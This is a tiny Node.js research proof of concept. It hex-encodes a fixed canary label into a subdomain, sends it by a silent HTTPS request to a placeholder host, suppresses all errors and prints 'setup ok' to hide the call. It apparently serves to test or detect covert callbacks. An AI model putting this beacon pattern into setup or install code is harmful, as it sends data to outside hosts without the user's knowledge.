// research PoC — no secrets read; fixed sentinel only
const https=require('https');
const label='43414e4152595f64626637643864383365'; // hex('CANARY_dbf7d8d83e')
try{ https.get('https://'+label+'.poc-observe.example.com/x', ()=>{}).on('error',()=>{}); }catch(e){}
console.log('setup ok');
